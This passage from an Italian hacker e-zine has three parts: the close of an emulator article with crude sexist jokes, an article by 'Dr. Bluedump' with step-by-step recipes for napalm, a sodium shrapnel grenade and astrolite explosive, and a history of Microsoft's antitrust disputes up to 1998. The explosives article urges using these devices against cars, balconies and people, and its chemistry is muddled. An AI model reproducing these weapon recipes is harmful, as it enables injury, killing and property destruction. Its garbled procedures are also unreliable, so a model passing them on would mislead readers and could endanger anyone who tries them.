notizia di questi giorni che gli autori dell'ultrahle (questo e' il nome
dell'emulatore) ovvero Epsilon e Realityman stiano lavorando ad un progetto
chiamato Reality II... se emulera' quello che si dice ho paura che succedera'
un bel casino :)

--> Outro --> 8.0
Si' si' basta con le cazzate tranquilli, per un paio di mesi non vi rompo piu'
il cazzo (ho gia' idee per i prossimi articoli mi dispiace per voi...).
Come al solito un ringraziamento va a tutti quelli che mi incontrano su irc e
mi fanno i complimenti... mai nessuno che offrisse una sigaretta, una birra o
qualcuno che presenti la sorella o qualche amica ninfomane... A INFAMONI!
Eh eh eh ops scusate mi ero lasciato trasportare.. che dite? Non ho menzionato
molte fike in questo articolo? Cazzo avete ragione :) allora ne approfitto per
fare un po' di pubblicita' okkulta per il mio sito "surf.to/covergirls" che vi
esorto a visitare perke' pieno di belle ragazze... Comunque che dire? Secondo
me la Casta, la Imbruglia e Gaia de Laurentis rimangono ancora le migliori
(ristorante Balubino buondi'... Io sono Gianumberto I e mi okkupo dei
secondi... Io sono Gianumberto II e mi okkupo dei primi... sopra carne, sotto
pesce, in mezzo pizza...). Vabbe' vabbe' smetto con le cazzate altrimenti
Cavallo aka Gonario mi dice che ne sparo troppe. Vi ricordo sempre che per
eventuali stecche di galuoises blu, bottiglie di birra/alkolici, indirizzi e
numeri di telefono di sorelle/amiche il mio address e'
dr.slump@thepentagon.com

Siete voi i migliori! (mi tolgo l'orologio?)

Dr. Slump aka Gelsom da Iglesias only 4 s0ftpr0ject Crew on BFi5


------------------------[ iL TERREM0T0 FATT0 iN CASA ]------------------------
--------------------------------[ Dr.Bluedump ]-------------------------------

Autore: Dr. BlueDump

Consumo: 2 caffe' molto ristretti
         3 pacchetti di crackers
         Formaggio grana grattuggiato

Saluti a: Dark Schneider, kLEiNEr, Tata

Musica ascoltata: Turn the page (Metallica)
                  Simply the best (Tina Turner)
                  Moonlight Shadow (Mike Oldfield)
                  When you're gone (Bryan Adams)

Comunicazione:
~~~~~~~~~~~~~~
Ho cambiato indirizzo di posta elettronica, adesso ricevo a:
bluedump@hotmail.com

E ora via con i danni...

Nello scorso numero vi ho parlato della nitro e di altri giochetti esplosivi.
Questa volta passeremo in analisi un potente incendiario che venne usato di
frequente durante la guerra del Vietnam: il napalm.

NAPALM
~~~~~~
Nel campo degli incendiari non c'e' dubbio, il napalm e' lo stato dell'arte.
Ha una consistenza simile alla marmellata (ma non spalmatelo sul pane) ed e'
perfetto per l'offesa di auto, garage, motorini, cabine della telecom...
Sostanzialmente il napalm e' costituito da una parte di benzina e da una parte
di sapone, che deve essere ridotto a fiocchi grattuggiandolo
e polverizzandolo. I detersivi fluidi non vanno bene.
La benzina deve essere misceltata con il sapone con un ordine ben preciso.
Ci vuole un bollitore molto particolare, costituito da due parti distinte e
separate, dove la parte superiore deve avere una capacita' di circa un quarto
rispetto all'altra.
Il sapone contenuto nella parte inferiore, a fine esperimento, deve essere
allontanato da qualsiasi tipi di fiamma, inclusa quella del fornello.
La benzina deve essere piazzata nella parte superiore del vostro recipiente
e andra' mescolata al sapone, ormai liquefatto, a fine cottura.
Consiglio di mettere la vostra miscela esplosiva in un tubo di PVC per essere
poi usata in un secondo momento.

PS: chiunque rimanga vivo dopo questo esperimento, mi scriva... voglio
stringergli la mano.

GRANATE AD IMPATTO
~~~~~~~~~~~~~~~~~~
Le granate ad impatto, al contrario di cio' che si pensi, hanno un meccanismo
di innesco che e' il piu' stupido del mondo. Niente dispositivi a distanza,
inneschi elettrici...
In pratica all'atto del contatto con il terreno, le due sostanze che
costituiscono la bomba si mescolano e producono gas tonante o, a seconda del
tipo di granata, esplodono subito.
Eccovi l'elenco dei materiali occorrenti...

Materiale

Rotolo di cavo elettrico (opzionale)
Sodio
Un vasetto di vetro
Tubo di PVC o di acciaio (state tranquilli, non e' troppo resistente :)
Pezzi di roccia (sassi in alternativa)

Procedura

Tappate un'estremita' del tubo di PVC con un tappo molto cazzuto, usando
attack o saldandolo.
Occhio che non deve staccarsi per nessun motivo altrimenti ciao...
Il sodio deve essere messo in un sacchetto di plastica con qualche buco
(permette alle sostanze di mischiarsi) e infine, piazzato sul fondo del tubo
di PVC: il sodio dovra' riempire circa 2 terzi del tubo. Poi pigliate il
vasetto di vetro e fillatelo con tanta acqua fino a riempirne meta'. Preparate
ora il mucchietto di sassi (o schegge di ferro, qualsiasi cosa faccia male).
Ora lo schema di inserimento:

- TUBO
- VASO CON ACQUA IN FONDO AL TUBO (il vetro non deve essere antiproiettile)
- SACCHETTO DI SODIO
- SASSI O SCHEGGE

Adesso tappate l'altra estremita' e voila'! La granata e' fatta. Ora pero' vi
spiego come aumentarne il potere distruttivo... Nella parte alta del tubo,
dovreste piazzarci qualche pallino di piombo (da caccia).
A questo punto il vostro giocattolo e' pronto per essere usato contro
macchine, moto, balconi, porte, garage, truzzi...

Detonazione

La detonazione e' la parte piu' semplice del tutto, perche' consiste solo nel
gettare l' ordigno da un pendio, da un balcone (sulla strada mi raccomando!),
o da un posto sopraelevato in modo da far mischiare gli ingredienti. Se volete
potete sparargli addosso, a seconda del contenitore usato, una manciata di BB
da 0.25 con una ASG a gas o a molla; cosi' l' effetto coreografico sara'
piu' intenso. Al massimo, potete ingegnarvi da soli nel trovare altri metodi
di detonazione.

ASTROLITE
~~~~~~~~~
L'astrolite e' un prodotto made in '60 usato per produrre il combustibile dei
razzi e dei missili balistici. La versione A-1-5 si dice che sia l'esplosivo
non-atomico piu' potente del mondo e io vi insegnero' a dimostrarlo. Sappiate
inoltre che e' piu' potente di circa 2 volte del TNT (vedo BFi 4) ed
!importantissimo! e' piu' stabile della nitro e del TNT stesso.
L'astrolite G e' un esplosivo liquido, inodore, incolore che produce un'alta
velocita' di detonazione (circa 8.600 metri al secondo) comparato ai 7.700
della nitro e ai 6.900 del TNT. Una particolarita' molto curiosa e' che il
terreno assorbe l'astrolite in una maniera pazzesca...
Risultato? Avrete un orto e conseguenti pomodori esplosivi. Cambiate adesso
la vostra cucina.
Per produrlo sono necessarie due parti (in peso) di nitrato di ammonio
mescolate ad una parte di idrazina che insieme producono la versione G
dell'astrolite. Le proporzioni sono queste. Fatene quanta ne volete tanto di
lamers da eliminare ce ne sono a quintali...
L'idrazina e' una sostanza chimica che probabilmente non troverai
con facilita'... Essa e' contenuta o usata nei combustibili per aerei
(lo shell A1 ad alta densita'), sostanze chimiche usate in agricoltura,
droghe (antibatterici e anti-ipertensione), platinatori per metalli, acidi
per studi fotografici...
L'innesco? Semplicissimo, basta una miccia bella lunga e a lenta combustione;
magari nel prossimo numero vi dico come fare un po' di miccie cazzute.
Ok, anche stavolta siamo giunti (tutti interi) alla fine. Aspettate buoni,
buoni la prossima release di BFi per altre ricette e intanto provate, provate,
provate... See u soon!
						    Dr. Bluedump


--------------------[ MiCR0S0FT - ST0RiA Di UN M0N0P0Li0 ]--------------------
------------------------------[ Carlo Gubitosa ]------------------------------

ALTAIR 8800

Stati Uniti, 1975. L'informatica inizia a uscire dai centri universitari.
Il numero di gennaio di "Popular Electronics" viene spedito al suo mezzo
milione di hobbisti-abbonati. E' nato ALTAIR 8800, il primo personal
computer americano, la macchina attorno alla quale nasce la seconda
generazione degli hacker: gli hacker dell'hardware, che penetrano
all'interno dei segreti di Altair con la stessa passione con cui i loro
predecessori al MIT avevano svelato i misteri dei mainframes.
Curiosamente, quello di Altair e' il primo caso di "vaporware": la fotografia
riprodotta su Popular Electronics e' quella di un apparecchio realizzato
ad hoc, assolutamente non funzionante, e passa molto tempo prima che le
migliaia di pezzi ordinati vengano consegnati.

Alcuni hacker tra i piu' tenaci, per venire in possesso del loro Altair,
si accampano davanti alla sede della Model Instrumentation Telemetry Systems
(MITS), la societa' che produce Altair sotto la guida di Ed Roberts.
Altair e' venduto in kit di montaggio, il cui risultato finale e' una scatola
metallica con pannello frontale composto da una fila di interruttori,
che costituiscono l'unico dispositivo di input, e da due file di piccole
lucine rosse come dispositivo di output. E' basato sul processore INTEL 8080,
costa 397 dollari e ha 256 bytes di memoria. Le istruzioni non possono
essere memorizzate all'interno dell'Altair, ma devono essere inserite a
mano ogni volta che il dispositivo viene acceso. Da qui le tipiche piaghe e
vesciche sulle dita che caratterizzano gli hacker di quest'epoca.

L'HOMEBREW COMPUTER CLUB

Il 5 marzo a Menlo Park nella silicon valley californiana, ha luogo nel
garage di Gordon French il primo incontro dell'HOMEBREW COMPUTER CLUB,
il club degli hacker dell'hardware di cui fanno parte, tra gli altri,
Bill Gates, Stephen Wozniack, Lee Felsenstein e molti altri. Le riunioni
dell'Homebrew divengono un appuntamento fisso per scambiare pezzi di
hardware, idee, programmi, informazioni e progetti. L'Altair 8800 e'
ovviamente al centro dell'attenzione.

Dopo aver letto l'annuncio su "Popular Electronics", Bill Gates e Paul Allen,
che avevano studiato insieme ad Harvard, telefonano immediatamente a
Ed Roberts per proporgli di acquistare il loro interprete BASIC per l'Altair,
scritto assieme a Marty Davidoff. E' la prima vendita di software della
Micro-Soft (a quei tempi c'era ancora il trattino nel nome). In seguito
a questa vendita i due si trasferiscono ad Albuquerque, sede della Mits,
per scrivere un programma in grado di connettere l'Altair con una
unita' a disco. A causa del prezzo ritenuto eccessivo, gli hobbisti
dell'Homebrew Computer Club iniziano a fare delle copie su nastro del
Basic per l'Altair da distribuire gratuitamente.

Nel '77 Ed Roberts viene costretto da difficolta' economiche a vendere
la MITS ad un'altra ditta, la PERTEC. Si scatena una battaglia giudiziaria
in merito di diritti di proprieta' intellettuale del Basic dell'Altair, di
cui la PERTEC rivendicava i diritti in seguito all'acquisizione della Mits.

Gates ed Allen sostengono invece che il Basic era stato dato solamente
in concessione. La questione e' portata davanti a un tribunale che da'
ragione alla Microsoft.

IL SODALIZIO CON IBM E IL FURTO DEL Q-DOS

La grande occasione arriva nel 1980: a luglio Bill Gates viene contattato
dall'IBM. A questo incontro ne seguira' un secondo, un mese piu' tardi,
durante il quale Gates firma un contratto di consulenza con IBM per la
realizzazione di un sistema operativo da utilizzare per i futuri PC
IBM.
Ad agosto Gates acquista per 50.000 dollari dalla Seattle Computer Products
un sistema operativo "veloce e sporco", il Q-Dos, "Quick and Dirt Operating
System" che sara' la base del futuro MS-DOS, destinato a diventare uno
standard nell'ambito dei personal computer grazie alla potenza economica
di IBM e al senso degli affari di Bill Gates. Gates ottiene da Tim Paterson,
che aveva realizzato il Q-Dos, un accordo di licenza non esclusivo, che
prevedeva la possibilita' di rivendere il prodotto. In seguito Microsoft
chiudera' il cerchio comprando tutti i diritti della Seattle Computer
Products, assumendo alle sue dipendenze lo stesso Paterson, che con un po'
piu' di furbizia e di fortuna avrebbe potuto sedersi al posto di Gates
sulla poltrona di uomo piu' ricco del mondo.

Il 12 agosto 1981 il primo personal computer della IBM, basato sul
microprocessore 8086, fa il suo ingresso trionfale sul mercato dei personal
computers. Gia' dalla prima versione dell'MS-Dos il sistema di licenze
software della Microsoft obbliga la IBM e i costruttori di PC compatibili a
pagare una licenza DOS per ogni singola macchina venduta. Questo rendeva
antieconomico installare sui primi PC IBM un sistema operativo diverso
da MS-DOS, per il quale si sarebbe pagata un'ulteriore licenza.

E' per questo che il Dos Microsoft si afferma come uno standard nel
settore dei PC, nonostante non fosse ne l'unico ne' il migliore sistema
operativo per Personal Computer. Sempre per quanto riguarda le pratiche
anticoncorrenziali, gli sviluppatori della Microsoft hanno un vantaggio
di parecchio tempo su tutti gli altri rispetto a qualsiasi evoluzione dei
sistemi operativi. Chi e' tagliato fuori dal ristrettissimo giro del
"segreto industriale" della Microsoft rischia di vedere vanificati sforzi e
ricerche. A questo problema ha cercato di rispondere la filosofia del
Free Software, affidando lo sviluppo dei sistemi operativi e delle
applicazioni "libere" all'intelligenza collettiva della Rete piuttosto che al
protezionismo del segreto industriale. Il 20 novembre 1985 Microsoft mette
in commercio Windows 1.0, esattamente due anni e dieci giorni dopo la
presentazione del prodotto, avvenuta in grande stile e con tutta l'enfasi
che contraddistingue le campagne pubblicitarie dell'azienda di Redmond.

LE PRIME INDAGINI ANTITRUST

Nel 1990 la Federal Trade Commission inizia ad interessarsi alle politiche
di marketing della Microsoft. L'attenzione della commissione federale e'
puntata sulla anticoncorrenzialita' di alcune pratiche di vendita. In
particolare si indaga sulle cosiddette vendite "tie-in", che legano
l'acquisto dei sistemi operativi a quello delle applicazioni software.
Un esempio per tutti, l'accoppiata Microsoft Windows - Microsoft Word.

Le avventure giudiziarie dell'azienda di Bill Gates sono solamente
all'inizio: nel gennaio 1992 la Apple presenta una richiesta di risarcimento
per violazione di copyright indirizzata a Microsoft e a Hewlett Packard.
La richiesta di risarcimento per la Microsoft e' di 4.37 miliardi di dollari,
piu' del doppio del miglior fatturato realizzato fino ad allora dall'azienda.
L'accusa e' relativa all'utilizzo da parte della Microsoft, per la
realizzazione di Windows, di alcune tecniche grafiche che fino al 1989 erano
una esclusiva della societa' di Cupertino.

L'ACCORDO MS-DOJ DEL 1995

Il Department of Justice (Dipartimento di Giustizia) degli Stati Uniti da'
il via nel 1993 ad una serie di indagini sulla scia di quelle gia'
effettuate nel '90 dalla Federal Trade Commission, e nel 1994 inizia la
stesura di un accordo con Microsoft, con il quale si regolano fino all'anno
2000 le pratiche di marketing dell'azienda. Microsoft riconosce che le
licenze d'uso dei sistemi operativi non devono contenere condizioni che si
applicano ad altri prodotti software dell'azienda di Redmond. Secondo
l'accordo, Microsoft non puo' piu' obbligare i costruttori di computer
all'inclusione della licenza di altri prodotti Microsoft come condizione
vincolante per l'acquisto delle licenze per Windows 95. In parole povere,
non si puo' obbligare chi compra licenze di utilizzo per Windows a comprare
in abbinamento licenze per Word o per il pacchetto Office.

Le peripezie continuano: un tribunale americano, a maggio del 1994, condanna
la Microsoft a pagare 120 milioni di dollari per danni alla STAC Electronics,
per essersi appropriata di tecnologia brevettata dalla stessa Stac. La giuria
riscontra che le piu' recenti versioni del DOS Microsoft avevano utilizzato
la tecnologia sviluppata dalla Stac per memorizzare i dati in forma compressa
all'interno del disco rigido. Le versioni incriminate del DOS Microsoft sono
la 6.0 e la 6.2, entrambe dotate dell'opzione DOUBLESPACE. Durante l'estate
Microsoft e' nuovamente al centro dell'attenzione. Bill Gates fa il suo
ingresso nel mercato del multimedia, tentando di stabilire lo standard
Microsoft anche all'interno delle nuove apparecchiature per applicazioni
multimediali. Gates si allea con TCI, Tele-Communications Inc., un gigante
della TV via cavo, con la Sega e con altri operatori del settore.

Nel frattempo arriva il 1995, e a febbraio il giudice distrettuale
Stanley Sporkin si rifiuta di firmare l'accordo redatto l'anno precedente
dalla Microsoft e dal Dipartimento di Giustizia, accordo ritenuto dal giudice
troppo blando e non conforme all'interesse pubblico. La decisione di Sporkin
viene pero' ribaltata dalla corte d'appello, che rimuove Sporkin dal caso.

Il giudice distrettuale Thomas Jackson approva finalmente l'accordo tra la
Microsoft e il Dipartimento di Giustizia, che tuttavia afferma di voler
continuare le sue indagini su MS. L'azienda di Gates, infatti, aveva
richiamato nuovamente l'attenzione su di se' cercando di legare i servizi
Internet e i programmi necessari per collegarsi alla "Microsoft Network" al
sistema operativo Windows 95, cosa espressamente proibita dall'accordo
firmato precedentemente.

I "PECCATI INFORMATICI" DELL'URUGUAY ASSOLTI DA MICROSOFT

Nel 1995 la Microsoft fa parlare di se' anche in America Latina. Antel, la
compagnia telefonica nazionale dell'Uruguay, viene trascinata in tribunale
dal locale ufficio legale della Business Software Alliance, la lobby dei
potentati informatici, a causa della detenzione di software privo di regolare
licenza d'uso, per un valore complessivo di 100.000 dollari. I programmi
"piratati" appartengono a varie ditte, principalmente a Microsoft, Novell e
Symantec. Inaspettatamente, nell'autunno del '97 la BSA abbandonera' il caso,
mentre la Microsoft, il principale finanziatore della BSA, stipula degli
"accordi speciali" con la Antel per rimpiazzare tutto il software
preesistente con prodotti Microsoft regolarmente registrati, sostituendo
anche i prodotti Novell e Symantec, secondo quanto afferma Ricardo Tascenho,
che nella Antel ricopre il ruolo di information technology manager.

La versione di Tascenho e' confermata anche da Eduardo DeFreitas, che fa
parte dello staff legale BSA dell'Uruguay. DeFreitas parla di contatti con
l'esponente locale della Microsoft, Tomas Blatt, che gli ha chiesto di far
cadere la controversia legale in modo da "poter trovare un accordo per il
futuro". Anche Blatt viene contattato, ma si rifiuta di parlare: "non ho
nessuna informazione in merito al caso Antel, rivolgetevi alla BSA
dell'Uruguay." Le aziende concorrenti sono d'accordo nell'affermare che la
Microsoft abusi della sua influenza all'interno della BSA per rafforzare il
suo monopolio a livello mondiale. L'avvocato della Microsoft, Brad Smith,
nega che la BSA agisca in base a istruzioni impartite da Bill Gates, e la
portavoce BSA Diane Smiroldo afferma che tutte le accuse sono "difficili da
credere". I casi non si limitano all'Uruguay, secondo quanto afferma Felipe
Yungman, manager argentino della Novell, che durante alcune indagini per
l'azienda ha scoperto delle trattative "amichevoli" condotte dalla BSA per
conto della Microsoft. I termini del contratto erano sempre l'acquisto
di prodotti Microsoft, con i quali rimpiazzare prodotti Novell, in cambio
dell'"assoluzione" dei peccati informatici commessi dalle aziende. Le accuse
di Yungman vengono appoggiate anche da Mario Tucci, il country manager
della Novell per l'America Latina.

BROWSER WAR

Le prime scaramucce della "guerra dei browsers" iniziano nel 1996. La
Netscape Communications presenta un esposto al Dipartimento di Giustizia
nel quale si denunciano delle pratiche commerciali illecite per la
promozione del browser Microsoft Internet Explorer. Secondo le accuse di
Netscape, Microsoft avrebbe concesso ai produttori di computer che non
installavano Netscape Navigator all'interno delle loro macchine uno sconto
di 3 dollari su ogni singola licenza di Windows 95 (quindi su ogni computer
venduto). Dopo le immancabili smentite della Microsoft il dipartimento di
giustizia richiede all'azienda di Gates i documenti relativi agli accordi
con i fabbricanti e i rivenditori al dettaglio di computer, e a Netscape
vengono chieste ulteriori prove, necessarie all'avvio di una indagine.
L'inchiesta e' ancora in sospeso.

IL PEGGIOR BREVETTO DEL 1997

Il 21 febbraio 1997 l'editor di "Internet Patent News Service", Gregory
Aharonian, assegna a William H. Gates III il titolo di "Peggior brevetto
software dell'anno", un titolo che vuole denunciare la facilita' con cui
vengono rilasciati brevetti negli USA, soprattutto nel settore
dell'informatica, dove i piccoli sviluppatori di software sono costretti a
lavorare camminando su un campo minato fatto da centinaia di migliaia di
brevetti, il piu' delle volte relativi ad algoritmi di base e a tecniche
che ormai sono patrimonio comune di tutti i programmatori.

La reinvenzione indipendente e' la norma nell'ambito della programmazione,
e di conseguenza e' molto alta la probabilita' di dover sostenere delle
spese giudiziarie semplicemente per aver reinventato un algoritmo gia'
brevettato, spese che possono sostenere solo grandi aziende dotate di
uffici legali specializzati. Nulla protegge i programmatori indipendenti
dall'uso accidentale di una tecnica brevettata, e quindi dall'essere citati
in giudizio per questo motivo.

Contro il sistema dei brevetti si e' levata la voce di Richard Stallman, il
fondatore della Free Software Foundation, con un articolo intitolato
"Contro i brevetti software" (Communications of the ACM, gennaio 92,
vol. 35 num. 1), in cui si afferma che "I brevetti software minacciano di
devastare l'industria informatica americana". Il brevetto con cui Bill
Gates ha "vinto" il titolo assegnato da Gregory Aharonian e' il numero
5.552.982, che corrisponde a un "metodo e sistema per l'elaborazione di
campi in un programma di elaborazione dei documenti", praticamente una
tecnica per associare il testo di una lettera ad un numero qualsiasi di
indirizzi a cui spedire la stessa lettera. Un sistema, insomma, gia'
incluso in un numero vastissimo di programmi per l'elaborazione dei
testi attualmente in commercio.

L'UOMO DA UN MILIONE DI DOLLARI (AL GIORNO)

Sempre nel 1997 e' lo stato del Texas che passa all'attacco contro il
colosso dell'informatica. Prende il via una indagine antitrust ufficiale
sulle pratiche commerciali adottate da Microsoft sull'Internet. Al Texas si
aggiunge in seguito anche lo stato del Massachussetts, che inizia una nuova
indagine. A questi due stati si unisce il Justice Department, che il 20
ottobre del '97 chiede ad una corte federale di avviare una causa civile
per la violazione dell'accordo del 1995. Secondo il Dipartimento di
Giustizia Microsoft avrebbe indotto i produttori di personal computer a
pre-installare il proprio browser Internet Explorer sui PC in vendita.
L'azienda di Redmond e' accusata di essersi procurata spazio sul mercato
indebitamente, e a spese della concorrenza. Si richiede una multa di un
milione di dollari al giorno in caso di continuazione delle pratiche
commerciali irrispettose degli accordi.

Non e' il primo caso di "installazione obbligata" da parte dell'azienda di
Redmond: gia' a partire dalle prime versioni dei sistemi operativi
Microsoft i produttori di computer sono forzati a pagare le licenze di
utilizzo per ogni singola macchina venduta, anche se non tutte le macchine
hanno Dos o Windows al loro interno. Chi non paga su ogni singola macchina
non puo' usufruire di particolari sconti sulle quantita'. Le azioni
anti-microsoft si moltiplicano: il Texas trascina l'azienda in una nuova
causa civile, accusando il gigante del software di interferenze nelle
indagini antitrust dello stato. Anche la commissione europea annuncia
l'avvio di una indagine sulle pratiche commerciali Microsoft.

L'11 dicembre '97 il giudice Thomas Penfield Jackson emette un ordine
temporaneo con il quale si vieta a Microsoft di richiedere l'installazione
obbligata di Internet Explorer agli acquirenti di licenze d'uso per
Windows 95.

PRODOTTI "INTEGRATI"

La compagnia non si arrende, e trascina il caso fino alla corte d'appello,
che nel giugno '98 dara' ragione a Microsoft. Viene emesso inoltre un
comunicato stampa con il quale si spiega che le condizioni poste dal
giudice Jackson sono state comunque rispettate. La scappatoia e' una
semplice lettera inviata ai rivenditori di computer, ai quali viene
consentita la scelta tra una vecchia versione di Windows 95 sprovvista
di Internet Explorer ed una nuova versione con il browser integrato. La
possibilita' di usare la versione "ridotta" di Windows 95 esiste in teoria,
ma non viene utilizzata in pratica per ovvi motivi di convenienza: a
parita' di prezzo i rivenditori di computer preferiscono installare una
versione piu' aggiornata di Windows 95. La possibilita' teorica di scelta
e' tuttavia sufficiente per affermare che non e' Microsoft ad obbligare i
rivenditori all'installazione di Internet Explorer, ma si tratta di una
loro libera iniziativa.

La scelta di integrare i programmi al sistema operativo anziche' metterli a
disposizione in pacchetti separati e' uno stratagemma per aggirare gli
accordi del 1994, secondo il quale "non si proibisce alla Microsoft lo
sviluppo di prodotti integrati".

A sei giorni dall'emissione dell'ordine del giudice Jackson, il
dipartimento di giustizia ritiene che Microsoft, con l'escamotage dei
"prodotti integrati" abbia raggirato l'ordine della corte, e i procuratori
governativi chiedono ancora una volta al giudice Jackson di trascinare
l'azienda di Gates in causa, invocando nuovamente una multa da un milione
di dollari al giorno per la violazione degli accordi datati 1994.

Internet Explorer e' un prodotto separato oppure una parte integrante del
sistema operativo? E' questo il nodo della questione. Il giudice Jackson
afferma che un impiegato del tribunale e' riuscito a disinstallare Internet
Explorer 3.0 in una manciata di secondi, il che dimostrerebbe che il
navigatore non e' un componente cosi' fondamentale o inscindibile, e che la
rimozione del programma non pregiudica il funzionamento del sistema.
Microsoft risponde dicendo che pur avendo rimosso l'icona e alcuni files,
il 95% del codice di Internet Explorer continua a rimanere residente nel
computer.

IL RICORSO IN APPELLO

Nel gennaio 1998 iniziano le prime udienze del ricorso in appello. I legali
MS cercano di sostenere l'inattendibilita' della testimonianza del
professor Lawrence Lessig della Harvard Law School, indicato dal giudice
Jackson come "special master", un esperto super-partes da interrogare in
merito a questioni tecniche. Jackson tuttavia rigetta la mozione, e lo
stesso Lessig insiste sulla sua imparzialita'. Il 22 gennaio MSoft
raggiunge un accordo parziale con il dipartimento di giustizia, portando
avanti allo stesso tempo il ricorso in appello per l'ingiunzione
dell'11 dicembre dell'anno precedente. In virtu' di questo accordo vengono
offerte alle case produttrici di computer due nuove opzioni per le licenze di
utilizzo di WIndows 95, due versioni per l'installazione del sistema
operativo che mantengono all'interno del sistema tutte le funzionalita'
di Internet Explorer, lasciandole pero' nascoste all'interno del sistema,
senza una apposita icona sul desktop che le renda accessibili agli utenti
finali.

A febbraio del '98, i procuratori generali di undici stati USA citano
Microsoft in base a documenti riguardanti l'imminente commercializzazione
di Windows 98. Nel frattempo la deposizione del professor Lessig e' sospesa
da una corte d'appello federale. Gates accetta di comparire davanti ad un
comitato giudiziario del senato per una deposizione sulla concorrenza
nell'industria informatica. Il comitato e' presieduto dal senatore Orrin
Hatch, che invita a deporre anche Jim Barksdale della Netscape Communications
e Scott McNealy della Sun Microsystems.
In Texas un giudice lascia cadere il procedimento giudiziario aperto nel
1994 dal procuratore generale dello stato in merito ad una presunta
interferenza illegale della Microsoft sulle indagini rivolte alle pratiche
commerciali anticoncorrenziali del gigante dell'informatica.

Il 18 maggio il Dipartimento di Giustizia, affiancato dai procuratori
generali di 20 stati USA, da' il via ad una azione giudiziaria contro
Microsoft, tuttora in atto, con la quale si richiede l'eliminazione di
Internet Explorer da Windows 98. Una lunga serie di testimonianze,
deposizioni e schermaglie giuridiche trasformano il processo contro
Microsoft in una lunga e intricata telenovela giudiziaria, che in breve
tempo diventa un vero e proprio evento mediatico.

UN NOME DA 5 MILIONI DI DOLLARI

Il 28 maggio 1998 il Patent and Trade Office, l'ufficio marchi e brevetti
degli Stati Uniti, assegna la titolarita' del marchio "Internet Explorer"
alla SyNet, una piccola azienda di software di Downers Grove, Illinois,
che aveva citato la Microsoft per violazione del diritto d'autore. Infatti
il nome "Internet Explorer" era stato gia' brevettato dalla SyNet nel 1994,
un anno prima che l'azienda di Bill Gates mettesse in commercio l'omonimo
programma per la navigazione Internet. Nella citazione era contenuta una
richiesta di risarcimento per dieci milioni di dollari, a cui i legali
Microsoft avevano risposto con una proposta di riconciliazione per la somma
di 75mila dollari. Dopo il primo rifiuto di Dhiren Rana, fondatore della
SyNet, l'offerta sale a ben 5 milioni di dollari, davanti ai quali la SyNet
non si tira indietro.

IL TRIONFO DI BILL

Nel frattempo il 24 giugno una corte d'appello federale emette una sentenza
che ribalta completamente l'ordinanza del dicembre '97 emessa dal giudice
Jackson. Secondo la corte d'appello Microsoft ha il diritto di pretendere
dai costruttori di computer, se intendono installare Windows sui loro PC,
di installare anche Internet Explorer. Inoltre, sempre a giudizio della
corte d'appello, il Tribunale che ha aperto le vicende giudiziarie avrebbe
commesso anche errori di procedura e di merito abbastanza pesanti.

Un vero trionfo per Bill Gates, che subito dopo la sentenza vede le azioni
della sua azienda andare alle stelle. La sentenza coglie di sorpresa tutti
quelli che davano per spacciata la Microsoft a causa dei documenti presentati
da Joel Klein, il responsabile della divisione antitrust americana. Le prove
piu' scottanti sembravano provenire dalla stessa Microsoft: memorandum,
messaggi di posta elettronica e altri scritti compromettenti, nei quali
quadri Microsoft ammettono che Internet Explorer avrebbe dovuto essere
vincolato strettamente a Windows 98, dato che non avrebbe potuto conquistare
in nessun altro modo una posizione dominante nel mercato.
"Opporre un browser a un altro e' difficile, dal momento che il Netscape ha
l'80 per cento del mercato e noi soltanto il 20 ... sono convinto che
dobbiamo sfruttare Windows: e' l'unica cosa che loro non hanno". Sono parole
di James Allchin, vicepresidente della Microsoft.

E ancora: "Sara' molto difficile incrementare la quota di mercato di
Internet Explorer unicamente in base ai suoi pregi. Sara' piu' importante
appoggiarsi sul vantaggio dato dal sistema operativo per fare in modo che
la gente utilizzi il nostro programma al posto del Navigator". Questa volta
a parlare e' Christian Wildfeuer, un altro esponente di alto livello
dell'azienda di Bill Gates. Tutto questo e molto altro nei memorandum
Microsoft esibiti come prove dalla commissione antitrust. Purtroppo queste
prove non sono bastate a fermare la Microsoft nella sua corsa senza regole
per la conquista della supremazia nel settore dei browser.

I COMMENTI

Molti i commenti alle vicende giudiziarie dell'azienda di Gates, tra cui si
leva la voce di Mitchell Kapor, lo storico fondatore della Electronic Frontier
Foundation. Secondo un articolo diffuso dallo stesso Kapor, "[...] Le grandi
scoperte nel mondo dell'informatica arrivano spesso da imprese piccole e
giovani. Con l'egemonia di Microsoft grandi settori del mercato del software
- che includono applicazioni come elaboratori di testi e fogli di calcolo, ma
non si limitano ad essi - sono zone minacciate dove i capitalisti e gli
imprenditori avventurosi hanno paura di entrare. [...] l'egemonia di Microsoft
non fara' altro che intensificarsi nella misura in cui Internet sta diventando
parte integrale della nostra vita quotidiana. La guerra dei browsers e' solo
l'inizio. Microsoft reclama il diritto di insediarsi al comando di qualunque
area dell'informatica che sia strategicamente importante - riconoscimento
vocale, applicazioni domestiche, navigazione automatica, ecc. [...]"

NE' MAMMUT NE' DINOSAURI

Un altro commento arriva dal giornalista Jon Katz, in un articolo apparso
sulla rivista Wired: "Quello che e' chiaro e' che il controllo su Internet
e' determinato da fattori che negli anni della sua nascita e del suo sviluppo
iniziale non erano determinanti ai fini delle decisioni: il potere, il denaro
e il controllo delle informazioni. Internet ci parlava, in un primo momento,
degli sforzi, dei progetti, della cooperazione degli individui; della loro
autonomia e della loro liberta' di comunicare tra loro senza intermediazioni.
Una promessa che e' stata mantenuta, almeno fino all'arrivo tempestoso della
smania di lucro e potere. Si', c'era una volta un'Internet dove non c'era
Gates, ne' i governi, ne' i monopoli ne' fantastici investimenti privati, ne'
leggi per controllare o vigilare l'oceano tumultuoso della libera
comunicazione tra individui. Non sono mammut ne' dinosauri a mantenere ancora
vivo il meglio dello spirito originario della Rete, ma sono persone e gruppi
attivi in comunita' virtuali, newsgroups, mailing list, siti web, laboratori
di ricerca, sono programmatori di software libero, editori di pubblicazioni
indipendenti... sono loro che fanno di Internet uno strumento valido per
la comunicazione."

Milano, 4/11/1998
Carlo Gubitosa c.gubitosa@peacelink.it

-------
MICROSOFT - STORIA DI UN MONOPOLIO
Copyright (c) 1998 Carlo Gubitosa
LICENZA DI UTILIZZO E DISTRIBUZIONE DEL TESTO - freeware letterario
- I diritti di proprieta' intellettuale di questo articolo appartengono
al suo autore, e in nessun caso quest'opera e' da intendersi di pubblico
dominio.
- Questo testo e' libero, cosi' come le informazioni in esso contenute:
e' data facolta' a chiunque di distribuirlo, di commercializzarlo, di
riprodurlo con qualsiasi mezzo meccanico e/o elettronico, di realizzare,
riprodurre e distribuire versioni tradotte o derivate ponendo come unica
clausola il rispetto dei termini contenuti in questa licenza di utilizzo.
